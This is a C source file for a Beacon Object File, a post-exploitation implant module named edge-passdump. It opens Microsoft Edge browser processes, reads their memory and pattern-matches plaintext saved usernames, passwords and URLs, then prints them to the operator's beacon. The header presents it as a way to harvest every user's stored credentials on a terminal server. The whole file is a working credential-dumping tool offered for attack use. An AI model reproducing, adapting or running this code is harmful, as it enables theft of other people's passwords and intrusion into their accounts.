/*
 * Edge Saved Passwords Dumper BOF (edge-passdump)
 *
 * Scans memory of msedge.exe browser processes for plaintext credentials saved
 * via the built-in Microsoft Password Manager / Autofill feature. When a user
 * stores a password in Edge, the credential is held in cleartext in the parent
 * (root) msedge.exe process memory, accessible to anyone with VM_READ on that
 * process. On a terminal server an administrator can therefore harvest stored
 * credentials for every interactive user from a single beacon.
 *
 * Microsoft has acknowledged this and stated it is "by design" - upstream tool:
 *   https://github.com/skesik/EdgeSavedPasswordsDumper
 *
 * Approach (mirrors the upstream C# tool):
 *   1. Enumerate processes via Toolhelp32 and pick msedge.exe instances whose
 *      parent is NOT also msedge.exe (i.e. the browser root, not a renderer).
 *   2. OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ).
 *   3. Walk committed PAGE_READWRITE regions with VirtualQueryEx +
 *      ReadProcessMemory.
 *   4. Byte-scan each region for the credential format Edge uses in memory:
 *        <letter>"http"["s"]" "<user 3..20>" "<pass 6..40>" \0"
 *      and the URL anchor immediately preceding it (3x NUL + URL chars).
 *
 * Requires SeDebugPrivilege / Administrator to read other users' processes.
 * Edge 147.0.3912.98 or older (newer builds may move/scrub the buffer).
 *
 * Argument contract: i  (PID, 0 = enumerate all root msedge processes)
 */

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ------------------------------------------------------------------ */
/* Configuration                                                      */
/* ------------------------------------------------------------------ */

#define MAX_PROCESSES         256      /* cap on msedge entries we track */
#define MAX_REGION_SIZE       (64 * 1024 * 1024)   /* skip regions > 64MB */
#define MAX_RESULTS           1024     /* dedup table size (entries)     */
#define MAX_RESULT_LEN        256      /* max bytes stored per dedup key */
#define MAX_URL_LOOKBACK      4096     /* bytes to scan back for URL     */
#define MAX_URL_LEN           512

#define USER_MIN              3
#define USER_MAX              20
#define PASS_MIN              6
#define PASS_MAX              40

/* ------------------------------------------------------------------ */
/* Imports                                                            */
/* ------------------------------------------------------------------ */

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT SIZE_T  WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT int     WINAPI KERNEL32$lstrcmpiW(LPCWSTR, LPCWSTR);

DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PSID_NAME_USE);

DECLSPEC_IMPORT int     WINAPIV MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int     __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT int     __cdecl MSVCRT$strcmp(const char*, const char*);

/* ------------------------------------------------------------------ */
/* Structures                                                         */
/* ------------------------------------------------------------------ */

typedef struct {
    DWORD pid;
    DWORD parentPid;
} EdgeProc;

typedef struct {
    char   keys[MAX_RESULTS][MAX_RESULT_LEN];
    int    count;
} ResultSet;

typedef struct {
    DWORD totalMatches;
    DWORD shownMatches;
    DWORD scannedProcesses;
} DumpStats;

/* ------------------------------------------------------------------ */
/* Character classes (mirroring upstream regex, ASCII subset + UTF-8) */
/* ------------------------------------------------------------------ */

static BOOL IsAsciiLetter(BYTE b) {
    return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z');
}

static BOOL IsAsciiDigit(BYTE b) {
    return (b >= '0' && b <= '9');
}

/* [a-zA-Z0-9\-_.@?\\] plus any byte >=0x80 (UTF-8 high bytes for non-ASCII) */
static BOOL IsUserChar(BYTE b) {
    if (IsAsciiLetter(b) || IsAsciiDigit(b)) return TRUE;
    switch (b) {
        case '-': case '_': case '.': case '@': case '?': case '\\':
            return TRUE;
        default:
            break;
    }
    if (b >= 0x80) return TRUE;
    return FALSE;
}

/*
 * Password class: same as upstream minus whitespace inside the body.
 * The upstream regex includes \s in the password class, but the trailing
 * delimiter is also a literal space, which forces backtracking. Excluding
 * spaces matches the vast majority of stored passwords and keeps the scanner
 * a single-pass linear walk. Document this constraint in the wrapper.
 */
static BOOL IsPassChar(BYTE b) {
    if (IsAsciiLetter(b) || IsAsciiDigit(b)) return TRUE;
    switch (b) {
        case '#': case '!': case '@': case '$': case '%': case '^':
        case '&': case '*': case '(': case ')': case '_': case '-':
        case '+': case '=': case '{': case '}': case '[': case ']':
        case ':': case ';': case '<': case '>': case '?': case '/':
        case '~': case '\\': case '.': case ',': case '\'': case '"':
        case '`': case '|':
            return TRUE;
        default:
            break;
    }
    if (b >= 0x80) return TRUE;
    return FALSE;
}

/* RFC3986 unreserved + reserved + percent (matches upstream URL class) */
static BOOL IsUrlChar(BYTE b) {
    if (IsAsciiLetter(b) || IsAsciiDigit(b)) return TRUE;
    switch (b) {
        case '-': case '.': case '_': case '~': case ':': case '/':
        case '?': case '#': case '[': case ']': case '@': case '!':
        case '$': case '&': case '\'': case '(': case ')': case '*':
        case '+': case ',': case ';': case '=': case '%':
            return TRUE;
        default:
            return FALSE;
    }
}

/* ------------------------------------------------------------------ */
/* Result deduplication                                               */
/* ------------------------------------------------------------------ */

static BOOL ResultSeen(ResultSet* set, const char* key) {
    for (int i = 0; i < set->count; i++) {
        if (MSVCRT$strcmp(set->keys[i], key) == 0) return TRUE;
    }
    return FALSE;
}

static void ResultAdd(ResultSet* set, const char* key) {
    if (set->count >= MAX_RESULTS) return;
    int n = 0;
    while (key[n] && n < MAX_RESULT_LEN - 1) {
        set->keys[set->count][n] = key[n];
        n++;
    }
    set->keys[set->count][n] = 0;
    set->count++;
}

/* ------------------------------------------------------------------ */
/* Process owner resolution                                           */
/* ------------------------------------------------------------------ */

static void GetProcessOwner(DWORD pid, char* out, size_t outSize) {
    HANDLE hProc = NULL;
    HANDLE hToken = NULL;
    DWORD needed = 0;
    BYTE  tokenBuf[256];
    PTOKEN_USER tu = NULL;
    WCHAR name[128];
    WCHAR domain[128];
    DWORD nameLen = 128;
    DWORD domainLen = 128;
    SID_NAME_USE use;

    MSVCRT$_snprintf(out, outSize, "UNKNOWN");

    /* PROCESS_QUERY_LIMITED_INFORMATION = 0x1000 */
    hProc = KERNEL32$OpenProcess(0x1000, FALSE, pid);
    if (!hProc) return;

    if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
        KERNEL32$CloseHandle(hProc);
        return;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenBuf, sizeof(tokenBuf), &needed)) {
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProc);
        return;
    }
    tu = (PTOKEN_USER)tokenBuf;

    if (ADVAPI32$LookupAccountSidW(NULL, tu->User.Sid, name, &nameLen, domain, &domainLen, &use)) {
        char nameUtf8[128];
        char domainUtf8[128];
        int i;
        for (i = 0; i < (int)nameLen && i < 127 && name[i]; i++) {
            nameUtf8[i] = (name[i] < 0x80) ? (char)name[i] : '?';
        }
        nameUtf8[i] = 0;
        for (i = 0; i < (int)domainLen && i < 127 && domain[i]; i++) {
            domainUtf8[i] = (domain[i] < 0x80) ? (char)domain[i] : '?';
        }
        domainUtf8[i] = 0;
        MSVCRT$_snprintf(out, outSize, "%s\\%s", domainUtf8, nameUtf8);
    }

    KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProc);
}

/* ------------------------------------------------------------------ */
/* URL extraction (look back from credential anchor)                  */
/* ------------------------------------------------------------------ */

/*
 * Find the URL preceding the credential anchor. Edge stores entries as
 * \x00\x00\x00<URL chars>http(s) <user> <pass>\0
 *
 * Walk backward from anchor (the leading letter of "http") collecting URL
 * bytes until a non-URL byte. Then verify there are >=3 NUL bytes immediately
 * before that. If the heuristic fails we still emit the credential without
 * the URL.
 */
static int ExtractUrl(const BYTE* buf, SIZE_T anchor, char* out, size_t outSize) {
    SIZE_T start;
    SIZE_T lookback;
    SIZE_T i;
    int n;

    out[0] = 0;
    if (anchor == 0) return 0;

    lookback = (anchor < MAX_URL_LOOKBACK) ? anchor : MAX_URL_LOOKBACK;
    start = anchor;
    for (i = 0; i < lookback; i++) {
        BYTE b = buf[anchor - 1 - i];
        if (IsUrlChar(b)) {
            start = anchor - 1 - i;
        } else {
            break;
        }
    }

    if (start >= anchor) return 0;

    /* Require 3 NUL bytes immediately before URL run (anchor heuristic). */
    if (start < 3) return 0;
    if (buf[start - 1] != 0 || buf[start - 2] != 0 || buf[start - 3] != 0) {
        return 0;
    }

    n = 0;
    for (i = start; i < anchor && n < (int)outSize - 1 && n < MAX_URL_LEN; i++) {
        out[n++] = (char)buf[i];
    }
    out[n] = 0;
    return n;
}

/* ------------------------------------------------------------------ */
/* Region scan                                                        */
/* ------------------------------------------------------------------ */

static void ScanRegion(const BYTE* buf, SIZE_T len, ResultSet* seen, DumpStats* stats) {
    SIZE_T i;

    /* Need at least: letter + http + space + 3 + space + 6 + space + null = 16 */
    if (len < 16) return;

    for (i = 0; i + 16 <= len; i++) {
        SIZE_T proto_end;
        SIZE_T user_start, user_end;
        SIZE_T pass_start, pass_end;
        SIZE_T user_len, pass_len;
        char user[USER_MAX + 1];
        char pass[PASS_MAX + 1];
        char url[MAX_URL_LEN];
        char key[MAX_RESULT_LEN];
        int j;

        if (!IsAsciiLetter(buf[i])) continue;

        /* "http" literal */
        if (buf[i+1] != 'h' || buf[i+2] != 't' ||
            buf[i+3] != 't' || buf[i+4] != 'p') continue;

        /* optional 's' then space */
        if (buf[i+5] == 's') {
            if (i + 6 >= len) break;
            if (buf[i+6] != ' ') continue;
            proto_end = i + 6;
        } else if (buf[i+5] == ' ') {
            proto_end = i + 5;
        } else {
            continue;
        }

        user_start = proto_end + 1;
        user_end = user_start;
        while (user_end < len &&
               (user_end - user_start) < USER_MAX &&
               IsUserChar(buf[user_end])) {
            user_end++;
        }
        user_len = user_end - user_start;
        if (user_len < USER_MIN) continue;

        if (user_end >= len || buf[user_end] != ' ') continue;

        pass_start = user_end + 1;
        pass_end = pass_start;
        while (pass_end < len &&
               (pass_end - pass_start) < PASS_MAX &&
               IsPassChar(buf[pass_end])) {
            pass_end++;
        }
        pass_len = pass_end - pass_start;
        if (pass_len < PASS_MIN) continue;

        if (pass_end + 1 >= len) continue;
        if (buf[pass_end] != ' ' || buf[pass_end + 1] != 0x00) continue;

        /* Copy out user/pass. */
        for (j = 0; j < (int)user_len; j++) user[j] = (char)buf[user_start + j];
        user[user_len] = 0;
        for (j = 0; j < (int)pass_len; j++) pass[j] = (char)buf[pass_start + j];
        pass[pass_len] = 0;

        url[0] = 0;
        ExtractUrl(buf, i, url, sizeof(url));

        stats->totalMatches++;

        if (url[0]) {
            MSVCRT$_snprintf(key, sizeof(key), "%s:%s@%s", user, pass, url);
        } else {
            MSVCRT$_snprintf(key, sizeof(key), "%s:%s", user, pass);
        }

        if (ResultSeen(seen, key)) continue;
        ResultAdd(seen, key);
        stats->shownMatches++;

        if (url[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s @ %s\n", user, pass, url);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", user, pass);
        }
    }
}

/* ------------------------------------------------------------------ */
/* Per-process scan                                                   */
/* ------------------------------------------------------------------ */

static void ScanProcess(DWORD pid, ResultSet* seen, DumpStats* stats) {
    HANDLE hProc;
    HANDLE hHeap;
    BYTE*  buf = NULL;
    SIZE_T bufSize = 0;
    LPVOID address = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    char owner[256];

    GetProcessOwner(pid, owner, sizeof(owner));

    /* PROCESS_QUERY_INFORMATION | PROCESS_VM_READ */
    hProc = KERNEL32$OpenProcess(0x0400 | 0x0010, FALSE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[!] Skipping PID %u (%s): OpenProcess failed (err %u)\n",
                     pid, owner, KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning PID %u (%s)\n", pid, owner);
    stats->scannedProcesses++;

    hHeap = KERNEL32$GetProcessHeap();

    while (KERNEL32$VirtualQueryEx(hProc, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        SIZE_T regionSize = (SIZE_T)mbi.RegionSize;
        LPVOID base = mbi.BaseAddress;

        /* advance pointer for next iteration regardless of read outcome */
        LPVOID next = (LPVOID)((BYTE*)base + regionSize);

        if (mbi.State == MEM_COMMIT &&
            mbi.Protect == PAGE_READWRITE &&
            regionSize > 0 &&
            regionSize <= MAX_REGION_SIZE) {

            if (regionSize > bufSize) {
                if (buf) KERNEL32$HeapFree(hHeap, 0, buf);
                buf = (BYTE*)KERNEL32$HeapAlloc(hHeap, 0, regionSize);
                bufSize = buf ? regionSize : 0;
            }

            if (buf) {
                SIZE_T bytesRead = 0;
                if (KERNEL32$ReadProcessMemory(hProc, base, buf, regionSize, &bytesRead) &&
                    bytesRead > 0) {
                    ScanRegion(buf, bytesRead, seen, stats);
                }
            }
        }

        if (next <= address) break; /* overflow guard */
        address = next;
    }

    if (buf) KERNEL32$HeapFree(hHeap, 0, buf);
    KERNEL32$CloseHandle(hProc);
}

/* ------------------------------------------------------------------ */
/* Process enumeration: find msedge.exe roots                         */
/* ------------------------------------------------------------------ */

static int EnumerateRootEdgeProcesses(DWORD targetPid, EdgeProc* out, int max) {
    HANDLE hSnap;
    HANDLE hHeap;
    PROCESSENTRY32W pe;
    EdgeProc* all = NULL;
    int allCount = 0;
    int outCount = 0;
    int i, j;

    hHeap = KERNEL32$GetProcessHeap();
    all = (EdgeProc*)KERNEL32$HeapAlloc(hHeap, 0, sizeof(EdgeProc) * MAX_PROCESSES);
    if (!all) return 0;

    hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        KERNEL32$HeapFree(hHeap, 0, all);
        return 0;
    }

    pe.dwSize = sizeof(pe);
    if (!KERNEL32$Process32FirstW(hSnap, &pe)) {
        KERNEL32$CloseHandle(hSnap);
        KERNEL32$HeapFree(hHeap, 0, all);
        return 0;
    }

    do {
        if (KERNEL32$lstrcmpiW(pe.szExeFile, L"msedge.exe") == 0) {
            if (allCount < MAX_PROCESSES) {
                all[allCount].pid = pe.th32ProcessID;
                all[allCount].parentPid = pe.th32ParentProcessID;
                allCount++;
            }
        }
    } while (KERNEL32$Process32NextW(hSnap, &pe));

    KERNEL32$CloseHandle(hSnap);

    /*
     * A msedge.exe entry is a "root" (browser process) if its parent PID is
     * NOT itself a msedge.exe entry. Renderer/GPU child processes share the
     * same image but are spawned by the root browser.
     */
    for (i = 0; i < allCount && outCount < max; i++) {
        BOOL parentIsEdge = FALSE;
        for (j = 0; j < allCount; j++) {
            if (all[j].pid == all[i].parentPid) {
                parentIsEdge = TRUE;
                break;
            }
        }
        if (parentIsEdge) continue;

        if (targetPid != 0 && all[i].pid != targetPid) continue;

        out[outCount++] = all[i];
    }

    KERNEL32$HeapFree(hHeap, 0, all);
    return outCount;
}

/* ------------------------------------------------------------------ */
/* BOF entry point                                                    */
/* ------------------------------------------------------------------ */

void go(char* args, int len) {
    datap parser;
    DWORD targetPid;
    EdgeProc roots[MAX_PROCESSES];
    int rootCount;
    HANDLE hHeap;
    ResultSet* seen;
    DumpStats stats;
    int i;

    BeaconDataParse(&parser, args, len);
    targetPid = (DWORD)BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Edge Saved Passwords Dumper BOF\n");
    if (targetPid != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target PID: %u\n", targetPid);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Enumerating msedge.exe root processes\n");
    }

    rootCount = EnumerateRootEdgeProcesses(targetPid, roots, MAX_PROCESSES);
    if (rootCount == 0) {
        if (targetPid != 0) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] No msedge.exe root process matched PID %u\n", targetPid);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] No msedge.exe root processes found\n");
        }
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %d candidate msedge.exe root process(es)\n\n",
                 rootCount);

    hHeap = KERNEL32$GetProcessHeap();
    seen = (ResultSet*)KERNEL32$HeapAlloc(hHeap, 0, sizeof(ResultSet));
    if (!seen) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate result table\n");
        return;
    }
    seen->count = 0;

    MSVCRT$memset(&stats, 0, sizeof(stats));

    for (i = 0; i < rootCount; i++) {
        ScanProcess(roots[i].pid, seen, &stats);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "\n[+] Done. Processes scanned: %u  Total matches: %u  Unique: %u\n",
                 stats.scannedProcesses, stats.totalMatches, stats.shownMatches);

    /* Wipe credential dedup table before free. */
    MSVCRT$memset(seen, 0, sizeof(ResultSet));
    KERNEL32$HeapFree(hHeap, 0, seen);
}
